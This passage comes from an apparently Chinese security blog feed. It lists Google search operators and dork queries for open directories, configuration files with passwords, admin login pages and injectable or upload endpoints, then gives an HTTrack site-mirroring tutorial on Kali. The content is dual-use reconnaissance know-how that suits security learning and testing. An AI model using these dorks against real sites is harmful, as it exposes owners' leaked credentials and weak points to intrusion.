<li><code>allintitle</code><ul>
<li>在页面中查找所有关键字；</li>
<li>不能很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>inurl</code><ul>
<li>在页面的URL中查找字符串；</li>
<li>能够很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>allinurl</code><ul>
<li>在页面的URL中查找所有关键字；</li>
<li>能够很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>filetype</code><ul>
<li>根据文件拓展名查找特定类型的文件；</li>
<li>等同于<code>ext</code>；</li>
<li>需要附加搜索关键字；</li>
<li>能够很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>allintext</code><ul>
<li>在页面中查找所有提交的关键字；</li>
</ul>
</li>
<li><code>site</code><ul>
<li>限定在某个特定的网站或者域搜索；</li>
<li>能够很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>link</code><ul>
<li>搜索链接到一个网站或URL的链接；</li>
<li>不能很好地和其他操作符混合使用；</li>
</ul>
</li>
<li><code>inanchor</code><ul>
<li>在连接的描述文本中查找文本；</li>
<li>能够很好地和其他操作符和搜索关键字混合使用；</li>
</ul>
</li>
<li><code>cache</code><ul>
<li>显示页面的缓存版本；</li>
<li>不能很好地和其他操作符或者关键字混合使用；</li>
</ul>
</li>
<li><code>info</code><ul>
<li>显示页面的摘要信息；</li>
<li>不能很好地和其他操作符或者关键字混合使用；</li>
</ul>
</li>
<li><code>related</code><ul>
<li>显示与“提交的网站或URL相关的”站点；</li>
<li>不能很好地和其他操作符或者关键字混合使用；</li>
</ul>
</li>
</ol>
<h1 id="目录列表搜索"><a href="#目录列表搜索" class="headerlink" title="目录列表搜索"></a>目录列表搜索</h1><ol>
<li><p>查找目录列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:index.of</span><br><span class="line">intitle:&quot;index of&quot;</span><br><span class="line">intitle:index.of &quot;parent directory&quot;		//更明确</span><br></pre></td></tr></table></figure></li>
<li><p>查找特定目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找能够通过目录列表访问的admin目录</span><br><span class="line">intitle:index.of.admin</span><br><span class="line">intitle:index.of intitle:admin</span><br></pre></td></tr></table></figure></li>
<li><p>查找特定文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找WS_FTP日志文件</span><br><span class="line">intitle:index.of ws_ftp.log</span><br><span class="line">filetype:log inurl:ws_ftp.log</span><br></pre></td></tr></table></figure></li>
<li><p>服务器版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找特定服务器版本网站</span><br><span class="line">intitle:index.of &quot;Apache/1.3.27 Server at&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="配置文件搜索"><a href="#配置文件搜索" class="headerlink" title="配置文件搜索"></a>配置文件搜索</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#PHP配置文件</span><br><span class="line">intitle:index.of config.php</span><br><span class="line">inurl:config.php dbuname dbpass</span><br><span class="line">inurl:php.ini filetype:ini</span><br><span class="line"></span><br><span class="line">#IPSEC配置文件</span><br><span class="line">inurl:ipsec.conf -intitle:manpage</span><br><span class="line"></span><br><span class="line">#ws_ftp配置文件</span><br><span class="line">intitle:index.of ws_ftp.ini</span><br><span class="line">filetype:ini ws_ftp pwd</span><br><span class="line"></span><br><span class="line">#eggdrop配置文件</span><br><span class="line">eggdrop filetype:user user</span><br><span class="line"></span><br><span class="line">#samba配置文件</span><br><span class="line">inurl:&quot;smb.conf&quot; intext:&quot;workgroup&quot; filetype:conf</span><br><span class="line"></span><br><span class="line">#防火墙配置文件</span><br><span class="line">filetype:conf inurl:firewall -intitle:cvs</span><br><span class="line"></span><br><span class="line">#vtunneID配置文件</span><br><span class="line">inurl:vtund.conf intext:pass -cvs</span><br><span class="line"></span><br><span class="line">#OpenLDAP配置文件</span><br><span class="line">filetype:conf slapd:conf</span><br><span class="line">inurl:&quot;slapd.conf&quot; intext:&quot;credentials&quot; -manpage-&quot;Manual Page&quot; -man: -sample</span><br><span class="line">inurl:&quot;slapd.conf&quot; intext:&quot;rootpw&quot; -manpage -&quot;Manual Page&quot; -man: -sample</span><br><span class="line"></span><br><span class="line">#FTP配置文件</span><br><span class="line">filetype:conf inurl:proftd.conf -sample</span><br><span class="line"></span><br><span class="line">#WV Dial配置文件</span><br><span class="line">inurl:&quot;wvdial.conf&quot; intext:&quot;password&quot;</span><br><span class="line"></span><br><span class="line">#SSL配置文件</span><br><span class="line">inurl:ssl.conf filetype:conf</span><br><span class="line"></span><br><span class="line">#MySQL配置文件</span><br><span class="line">filetype:cnf my.cnf -cvs -example</span><br><span class="line"></span><br><span class="line">#Oracle客户端配置文件</span><br><span class="line">filetype:ora ora</span><br><span class="line"></span><br><span class="line">#Oracle配置文件</span><br><span class="line">filetype:ora tnsnames</span><br><span class="line"></span><br><span class="line">#LeapFTP客户端配置文件</span><br><span class="line">LeapFTP intitle:&quot;index.of./&quot; site:ini modified</span><br><span class="line"></span><br><span class="line">#ODBC客户端配置文件</span><br><span class="line">inurl:odbc.ini ext:ini -cvs</span><br><span class="line"></span><br><span class="line">#Putty以保存的会话数据</span><br><span class="line">inurl:&quot;putty.reg&quot;</span><br><span class="line"></span><br><span class="line">#IIS Web配置文件</span><br><span class="line">filetype:config web.config -CVS</span><br><span class="line"></span><br><span class="line">#VMWare配置文件</span><br><span class="line">ext:cfg radius.cfg</span><br><span class="line"></span><br><span class="line">#UNIX Frontpage Extensions配置文件</span><br><span class="line">filetype:cnf inurl:_vti_pvt access.cnf</span><br><span class="line"></span><br><span class="line">#HP以太网交换配置文件</span><br><span class="line">intitle:&quot;DEFAULT_COUNFIG - HP&quot;</span><br><span class="line"></span><br><span class="line">#Steam配置文件</span><br><span class="line">intext:&quot;SteamUserPasshrase=&quot; intext:&quot;StreamAppUser=&quot; -&quot;username&quot; -&quot;user&quot;</span><br><span class="line"></span><br><span class="line">#Cisco配置文件</span><br><span class="line">intext:&quot;enable password 7&quot;</span><br><span class="line"></span><br><span class="line">#Ruby on Rails数据连接器文件</span><br><span class="line">ext:yml database inurl:config</span><br><span class="line"></span><br><span class="line">#FlashFXP站点数据文件</span><br><span class="line">inurl:&quot;Site.dat&quot;+&quot;PASS=&quot;</span><br><span class="line"></span><br><span class="line">#FlashFXP配置文件</span><br><span class="line">filetype:ini inurl:flashFXP.ini</span><br><span class="line"></span><br><span class="line">#通用配置文件</span><br><span class="line">ext:ini intext:env.ini</span><br><span class="line">intitle:index.of.config</span><br></pre></td></tr></table></figure>

<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找后台地址：site:域名</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line">#查找文本内容</span><br><span class="line">site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line">#查找可注入点</span><br><span class="line">site:域名 inurl:aspx|jsp|php|asp</span><br><span class="line"></span><br><span class="line">#查找上传漏洞</span><br><span class="line">site:域名 inurl:file|load|editor|Files</span><br><span class="line"></span><br><span class="line">#查看脚本类型</span><br><span class="line">site:域名 filetype:asp/aspx/php/jsp</span><br><span class="line"></span><br><span class="line">#迂回策略</span><br><span class="line">inurl:cms/data/templates/images/index/</span><br><span class="line"></span><br><span class="line">#网络设备关键词</span><br><span class="line">intext:WEB Management Interface for H3C SecPath Series</span><br><span class="line"></span><br><span class="line">#存在的数据库</span><br><span class="line">site:域名 filetype:mdb|asp|#</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/f8062e2cc1d7">https://www.jianshu.com/p/f8062e2cc1d7</a></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Google Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTrack简单使用</title>
    <url>/HTTrack%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>HTTrack</code>是一个免费的（GPL，自由软件）和易于使用的离线浏览器工具。它可以爬取整站的网页，用于离线浏览，减少与目标系统交互。它可从<code>Internet</code>上下载万维网站点到本地目录，递归地构建所有目录，从服务器获取<code>HTML</code>、图像和其他文件到本地。<code>HTTrack</code>安排原始网站的相关链接结构。只需在浏览器中打开“镜像”网站的页面，即可从链接到链接浏览网站，就像在线查看网站一样。<code>HTTrack</code>也可以更新现有的镜像站点，并恢复中断的下载。<code>HTTrack</code>完全可配置，并具有集成的帮助系统。<span id="more"></span></p>
<h1 id="HTTrack安装"><a href="#HTTrack安装" class="headerlink" title="HTTrack安装"></a><code>HTTrack</code>安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get install httrack</span></span><br></pre></td></tr></table></figure>

<h1 id="HTTrack交互模式使用步骤"><a href="#HTTrack交互模式使用步骤" class="headerlink" title="HTTrack交互模式使用步骤"></a><code>HTTrack</code>交互模式使用步骤</h1><ol>
<li><p>创建目录存储复制网站</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mkdir mywebsite</span></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117195447.png"></p>
</li>
<li><p>启动<code>HTTrack</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># httrack</span></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117172009.png"></p>
</li>
<li><p>输入项目名称</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter project name : blog	//blog为项目名称</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117171943.png"></p>
</li>
<li><p>选择存储网站目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base path (<span class="built_in">return</span>=/root/websites/) :/root/mywebsite</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117171926.png"></p>
</li>
<li><p>输入网站的URL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter URLs (separated by commas or blank spaces) :www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200710.png"></p>
</li>
<li><p>选择操作(此处选择2)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Action:</span><br><span class="line">(enter) 1	Mirror Web Site(s)		//直接镜像站点</span><br><span class="line">        2	Mirror Web Site(s) with Wizard		//用向导完成镜像</span><br><span class="line">        3	Just Get Files Indicated		//只get某种特定的文件</span><br><span class="line">        4	Mirror ALL links <span class="keyword">in</span> URLs (Multiple Mirror)//镜像在这个url下所有的链接</span><br><span class="line">        5	Test Links In URLs (Bookmark Test)	//测试在这个url下的链接</span><br><span class="line">        0	Quit	//退出</span><br><span class="line">: </span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200731.png"></p>
</li>
<li><p>指定是否在实施攻击时使用代理(此处默认输入none，不使用代理)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Proxy (<span class="built_in">return</span>=none) :</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200756.png"></p>
</li>
<li><p>定义字符，爬取特定类型的数据(此处输入<code>*</code>表示爬取全部类型数据)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip</span><br><span class="line">Wildcards (<span class="built_in">return</span>=none) :*</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200814.png"></p>
</li>
<li><p>设置更多选项，可以使用<code>help</code>查看(此处选择默认)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, <span class="built_in">type</span> <span class="built_in">help</span></span><br><span class="line">Additional options (<span class="built_in">return</span>=none) :</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200836.png"></p>
</li>
<li><p>开始克隆网站</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117200903.png"></p>
</li>
<li><p>查看克隆的文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200117201137.png"></p>
</li>
</ol>
<p>备注：<code>httrack</code>只能用于克隆静态内容，并且无法完全复制网站上的动态内容、中间部分(数据库)等内容。</p>
<h1 id="HTTrack一般模式使用步骤"><a href="#HTTrack一般模式使用步骤" class="headerlink" title="HTTrack一般模式使用步骤"></a><code>HTTrack</code>一般模式使用步骤</h1><p><strong>语法</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">httrack &lt;URLs&gt; [-option] [+&lt;URL_FILTER&gt;] [-&lt;URL_FILTER&gt;] [+&lt;mime:MIME_FILTER&gt;] [-&lt;mime:MIME_FILTER&gt;]</span><br></pre></td></tr></table></figure>

<p> 选项如下：（*为默认值） </p>
<h2 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">O  镜像路径/缓存和日志文件路径</span><br><span class="line">-O 镜像路径[,缓存和日志文件路径] (--path &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="行为选项"><a href="#行为选项" class="headerlink" title="行为选项"></a>行为选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">w  *镜像网站 (--mirror)</span><br><span class="line">W	镜像网站，半自动 (asks questions) (--mirror-wizard)</span><br><span class="line">g	只获取文件（保存在当前目录中） (--get-files)</span><br><span class="line">i	使用缓存继续中断的镜像 (--continue)</span><br><span class="line">Y	镜像所有位于第一级页面的链接 (镜像链接) (--mirrorlinks)</span><br></pre></td></tr></table></figure>

<h2 id="代理选项"><a href="#代理选项" class="headerlink" title="代理选项"></a>代理选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">P   代理使用 (-P proxy:port or -P user:pass@proxy:port) (--proxy &lt;param&gt;)</span><br><span class="line">%f *使用ftp代理 (f0 don&#x27;t use) (--httpproxy-ftp[=N])</span><br><span class="line">%b  使用此本地主机名发出/发送请求 (-%b 主机名) (--bind &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="限制选项"><a href="#限制选项" class="headerlink" title="限制选项"></a>限制选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">rN	  将“镜像深度”设置为N (* r9999) (--depth[=N])</span><br><span class="line">%eN   将“外部链接深度”设置为N (* %e0) (--ext-depth[=N])</span><br><span class="line">mN    将非HTML文件的最大文件长度设置为N (--max-files[=N])</span><br><span class="line">mN,N2 将非HTML文件的最大文件长度设置为N、将HTML文件的最大文件长度设置为N2</span><br><span class="line">MN    将可上传/扫描的最大总长度设置为N (--max-size[=N])</span><br><span class="line">EN    将最大镜像传输时间设置为N秒 (60=1 minute, 3600=1 hour) (--max-time[=N])</span><br><span class="line">AN    将最大传输速率设置为N字节/秒 (1000=1KB/s max) (--max-rate[=N])</span><br><span class="line">%cN   将最大连接数设置为N个/秒 (*%c10) (--connection-per-second[=N])</span><br><span class="line">GN    设置如果达到N个字节，则暂停传输，并等待锁定文件被删除 (--max-pause[=N])</span><br></pre></td></tr></table></figure>

<h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cN  设置连接数为N (*c8) (--sockets[=N])</span><br><span class="line">TN  设置关闭无响应链接N秒后超时 (--timeout)</span><br><span class="line">RN  设置超时或非致命错误情况下的重试次数为N (*R1) (--retries[=N])</span><br><span class="line">JN  流量阻塞控制，设置链路允许的最小传输速率为N字节/秒 (--min-rate[=N])</span><br><span class="line">HN  如果：0=从不、1=超时、2=慢、3=超时或慢，则放弃主机 (--host-control[=N])</span><br></pre></td></tr></table></figure>

<h2 id="链接选项"><a href="#链接选项" class="headerlink" title="链接选项"></a>链接选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">%P        *扩展解析，尝试解析所有链接，即使是未知标记或Javascript标记 (%P0 don&#x27;t use) (--extended-parsing[=N])</span><br><span class="line">n          在html文件附近获取非html文件 (例如：位于外部的图像) (--near)</span><br><span class="line">t          测试所有url（即使url被禁止） (--test)</span><br><span class="line">%L &lt;file&gt;  添加位于此文本文件中的所有URL（每行一个URL）  (--list &lt;param&gt;)</span><br><span class="line">%S &lt;file&gt;  添加位于此文本文件中的所有扫描规则（每行一个扫描规则） (--urllist &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="构建选项"><a href="#构建选项" class="headerlink" title="构建选项"></a>构建选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">NN	结构类型 (0 *原始结构, 1+: 详见下文) (--structure[=N])</span><br><span class="line">    或用户定义的结构 (-N &quot;%h%p/%n%q.%t&quot;)</span><br><span class="line">%N  延迟类型检查，不进行任何链接测试，而是等待文件下载开始（实验性的）(N0 不使用，%N1 用于未知扩展名，*%N2 始终使用)</span><br><span class="line">%D  缓存的延迟类型检查，不要在更新期间等待远程类型，以加快更新速度 (%D0 等待, * %D1 不等待) (--cached-delayed-type-check)</span><br><span class="line">%M  生成RFC MIME封装的完整存档 (.mht) (--mime-html)</span><br><span class="line">LN	长名称 (L1 *长名称 / L0 8-3 转换 / L2 ISO9660 兼容) (--long-names[=N])</span><br><span class="line">KN	保留原始链接 (e.g. http://www.adr/link) (K0 *相对链接, K 绝对链接, K4 原始链接, K3 绝对URI链接, K5 透明代理链接) (--keep-links[=N])</span><br><span class="line">x	用错误页替换外部html链接 (--replace-external)</span><br><span class="line">%x	不包括受外部密码保护的网站的任何密码 (%x0 包括) (--disable-passwords)</span><br><span class="line">%q *包含本地文件的查询字符串 (无用,仅供参考) (%q0 不包含) (--include-query-string)</span><br><span class="line">o  *出错时生成输出html文件 (404..) (o0 不生成) (--generate-errors)</span><br><span class="line">X  *更新后清除旧文件 (X0 保持删除) (--purge-old[=N])</span><br><span class="line">%p	保留html文件“原样” (与&#x27;-K4 -%F &quot;&quot;&#x27;相同) (--preserve)</span><br><span class="line">%T	链接转换为UTF-8 (--utf8-conversion)</span><br></pre></td></tr></table></figure>

<h2 id="蜘蛛选项"><a href="#蜘蛛选项" class="headerlink" title="蜘蛛选项"></a>蜘蛛选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">bN	接受cookies.txt中的cookies (0=不接受,* 1=接受) (--cookies[=N])</span><br><span class="line">u	检查未知文档类型 (cgi,asp..) (u0 不检查, * u1 检查除了 /, u2 始终检查) (--check-type[=N])</span><br><span class="line">j  *解析JAVA类 (j0 不解析, 位掩码: |1 解析默认值, |2 不解析.class文件 |4 不解析.js文件 |8 不越界解析) (--parse-java[=N])</span><br><span class="line">sN	遵循robots.txt和meta robots标记 (0=never,1=sometimes,* 2=always, 3=always (even strict rules)) (--robots[=N])</span><br><span class="line">%h  强制HTTP/1请求 (仅针对旧服务器或代理减少更新特性) (--http-10)</span><br><span class="line">%k	尽可能使用keep alive，大大减少小文件和测试请求的延迟 (%k0 不使用) (--keep-alive)</span><br><span class="line">%B  容忍请求 (在某些服务器上接受虚假响应，但不是标准的!) (--tolerant)</span><br><span class="line">%s  更新非法入侵：在更新时限制重新传输的各种非法入侵(相同大小，虚假响应…) (--updatehack)</span><br><span class="line">%u  url非法入侵：限制重复url的各种非法入侵 (strip //, www.foo.com==foo.com..) (--urlhack)</span><br><span class="line">%A  假设一个类型(cgi,asp..)总是与一个mime类型链接 (-%A php3,cgi=text/html;dat,bin=application/x-zip) (--assume &lt;param&gt;)</span><br><span class="line">     快捷方式：&#x27;--assume standard&#x27;相当于-%A php2 php3 php4 php cgi asp jsp pl cfm nsf=text/html</span><br><span class="line">     也可以用于强制特定的文件类型：-assume foo.cgi=text/html</span><br><span class="line">@iN	internet协议 (0=both ipv6+ipv4, 4=ipv4 only, 6=ipv6 only) (--protocol[=N])</span><br><span class="line">%w  禁用特定的外部mime模块 (-%w htsswf -%w htsjava) (--disable-module &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="浏览器ID"><a href="#浏览器ID" class="headerlink" title="浏览器ID"></a>浏览器ID</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">F   在HTTP头中发送的用户代理字段 (-F &quot;user-agent name&quot;) (--user-agent &lt;param&gt;)</span><br><span class="line">%R  在HTTP头中发送的默认referer字段 (--referer &lt;param&gt;)</span><br><span class="line">%E  从以HTTP头发送的电子邮件地址 (--from &lt;param&gt;)</span><br><span class="line">%F  Html代码中的页脚字符串 (-%F &quot;Mirrored [from host %s [file %s [at %s]]]&quot; (--footer &lt;param&gt;)</span><br><span class="line">%l  首选语言 (-%l &quot;fr, en, jp, *&quot; (--language &lt;param&gt;)</span><br><span class="line">%a  接受格式 (-%a &quot;text/html,image/png;q=0.9,*/*;q=0.1&quot; (--accept &lt;param&gt;)</span><br><span class="line">%X  附加的HTTP标题行 (-%X &quot;X-Magic: 42&quot; (--headers &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="日志、索引、缓存"><a href="#日志、索引、缓存" class="headerlink" title="日志、索引、缓存"></a>日志、索引、缓存</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C   创建/使用缓存进行更新和重试 (C0 无缓存,C1 缓存优先,* C2 测试更新前) (--cache[=N])</span><br><span class="line">k   将所有文件存储在缓存中 (如果文件在磁盘上，则此功能不可用) (--store-all-in-cache)</span><br><span class="line">%n  不能重新下载本地删除的文件 (--do-not-recatch)</span><br><span class="line">%v  在屏幕上显示下载的文件名(实时) - * %v1 缩写版 - %v2 完整 (--display)</span><br><span class="line">Q   无日志-安静模式  (--do-not-log)</span><br><span class="line">q   无问题-安静模式 (--quiet)</span><br><span class="line">z   日志-附加信息 (--extra-log)</span><br><span class="line">Z   日志-debug (--debug-log)</span><br><span class="line">v   登录屏幕 (--verbose)</span><br><span class="line">f  *登录文件 (--file-log)</span><br><span class="line">f2  一个单一日志文件(--single-log)</span><br><span class="line">I  *编制索引 (I0 不编制索引) (--index)</span><br><span class="line">%i  为项目文件夹创建顶级索引 (* %i0 不创建) (--build-top-index)</span><br><span class="line">%I  为此镜像创建可搜索索引 (* %I0 不创建) (--search-index)</span><br></pre></td></tr></table></figure>

<h2 id="专家选项"><a href="#专家选项" class="headerlink" title="专家选项"></a>专家选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pN  优先模式: (* p3) (--priority[=N])</span><br><span class="line">     p0 只扫描，不保存任何内容 (用于检查链接)</span><br><span class="line">     p1 只保存html文件</span><br><span class="line">     p2 只保存非html文件</span><br><span class="line">    *p3 保存所有文件</span><br><span class="line">     p7 先获取html文件，然后处理其他文件</span><br><span class="line">S   保持在同一个目录 (--stay-on-same-dir)</span><br><span class="line">D  *只能进入子目录 (--can-go-down)</span><br><span class="line">U   只能进入父目录 (--can-go-up)</span><br><span class="line">B   可以上下进入目录结构 (--can-go-up-and-down)</span><br><span class="line">a  *保持在同一地址 (--stay-on-same-address)</span><br><span class="line">d   保持在同一主域 (--stay-on-same-domain)</span><br><span class="line">l   保持相同的TLD (eg: .com) (--stay-on-same-tld)</span><br><span class="line">e   go everywhere on the web (--go-everywhere)</span><br><span class="line">%H  在日志文件中调试HTTP头 (--debug-headers)</span><br></pre></td></tr></table></figure>

<h2 id="权威选项"><a href="#权威选项" class="headerlink" title="权威选项"></a>权威选项</h2><p>（尽量避免使用）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#X  *使用优化引擎 (有限内存边界检查) (--fast-engine)</span><br><span class="line">#0   过滤测试 (-#0 &#x27;*.gif&#x27; &#x27;www.bar.com/foo.gif&#x27;) (--debug-testfilters &lt;param&gt;)</span><br><span class="line">#1   简化测试 (-#1 ./foo/bar/../foobar)</span><br><span class="line">#2   类型测试 (-#2 /foo/bar.php)</span><br><span class="line">#C   换成列表 (-#C &#x27;*.com/spider*.gif&#x27; (--debug-cache &lt;param&gt;)</span><br><span class="line">#R   缓存修复 (损坏缓存) (--repair-cache)</span><br><span class="line">#d   调试分析器 (--debug-parsing)</span><br><span class="line">#E   在meta.zip中提取new.zip缓存元数据</span><br><span class="line">#f   总是刷新日志文件 (--advanced-flushlogs)</span><br><span class="line">#FN  过滤器的最大过滤数目 (--advanced-maxfilters[=N])</span><br><span class="line">#h   版本信息 (--version)</span><br><span class="line">#K   扫描标准输入 (debug) (--debug-scanstdin)</span><br><span class="line">#L   最大链接数 (-#L1000000) (--advanced-maxlinks[=N])</span><br><span class="line">#p   显示进度信息 (--advanced-progressinfo)</span><br><span class="line">#P   抓取URL (--catch-url)</span><br><span class="line">#R   旧的FTP例程 (debug) (--repair-cache)</span><br><span class="line">#T   每分钟生成一次传输操作日志 (--debug-xfrstats)</span><br><span class="line">#u   等待时间 (--advanced-wait)</span><br><span class="line">#Z   每分钟生成传输速率的静态数据 (--debug-ratestats)</span><br></pre></td></tr></table></figure>

<h2 id="危险选项"><a href="#危险选项" class="headerlink" title="危险选项"></a>危险选项</h2><p>（尽量避免使用）</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">%!  绕过旨在避免带宽滥用的内置安全限制 (带宽，并发连接) (--disable-security-limits)</span><br></pre></td></tr></table></figure>

<p>危险选项，仅适用于专家；</p>
<p>谨慎使用；</p>
<h2 id="命令行特定选项"><a href="#命令行特定选项" class="headerlink" title="命令行特定选项"></a>命令行特定选项</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">V   执行每个文件后的系统命令 ($0 is the filename: -V &quot;rm \$0&quot;) (--userdef-cmd &lt;param&gt;)</span><br><span class="line">%W  使用外部库函数作为包装器 (-%W myfoo.so[,myparameters]) (--callback &lt;param&gt;)</span><br></pre></td></tr></table></figure>

<h2 id="选项N详情"><a href="#选项N详情" class="headerlink" title="选项N详情"></a>选项N详情</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">N0 站点结构 (默认)</span><br><span class="line">N1 HTML in web/, images/other files in web/images/</span><br><span class="line">N2 HTML in web/HTML, images/other in web/images</span><br><span class="line">N3 HTML in web/,  images/other in web/</span><br><span class="line">N4 HTML in web/, images/other in web/xxx, where xxx is the file extension (all gif will be placed onto web/gif, for example)</span><br><span class="line">N5 Images/other in web/xxx and HTML in web/HTML</span><br><span class="line">N99 All files in web/, with random names (gadget !)</span><br><span class="line">N100 站点结构，不包括www.domain.xxx/</span><br><span class="line">N101 Identical to N1 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N102 Identical to N2 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N103 Identical to N3 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N104 Identical to N4 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N105 Identical to N5 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N199 Identical to N99 exept that &quot;web&quot; is replaced by the site&#x27;s name</span><br><span class="line">N1001 Identical to N1 exept that there is no &quot;web&quot; directory</span><br><span class="line">N1002 Identical to N2 exept that there is no &quot;web&quot; directory</span><br><span class="line">N1003 Identical to N3 exept that there is no &quot;web&quot; directory (option set for g option)</span><br><span class="line">N1004 Identical to N4 exept that there is no &quot;web&quot; directory</span><br><span class="line">N1005 Identical to N5 exept that there is no &quot;web&quot; directory</span><br><span class="line">N1099 Identical to N99 exept that there is no &quot;web&quot; directory</span><br></pre></td></tr></table></figure>



<h2 id="用户定义选项N详情"><a href="#用户定义选项N详情" class="headerlink" title="用户定义选项N详情"></a>用户定义选项N详情</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27;%n&#x27; 没有文件类型的文件名 (ex: image)</span><br><span class="line">&#x27;%N&#x27; 文件名，包括文件类型 (ex: image.gif)</span><br><span class="line">&#x27;%t&#x27; 文件类型 (ex: gif)</span><br><span class="line">&#x27;%p&#x27; 路径 [无结尾 /] (ex: /someimages)</span><br><span class="line">&#x27;%h&#x27; 主机名 (ex: www.someweb.com)</span><br><span class="line">&#x27;%M&#x27; URL MD5 (128位，32个ascii字节)</span><br><span class="line">&#x27;%Q&#x27; 查询字符串MD5 (128位，32个ascii字节)</span><br><span class="line">&#x27;%k&#x27; 完整查询字符串</span><br><span class="line">&#x27;%r&#x27; 协议名 (ex: http)</span><br><span class="line">&#x27;%q&#x27; 短查询字符串 (16位，4个ascii字节)</span><br><span class="line">	 &#x27;%s?&#x27; 短名称版本 (ex: %sN)</span><br><span class="line">&#x27;%[param]&#x27; 查询字符串中的param变量</span><br><span class="line">&#x27;%[param:before:after:empty:notfound]&#x27; 高级变量提取</span><br></pre></td></tr></table></figure>



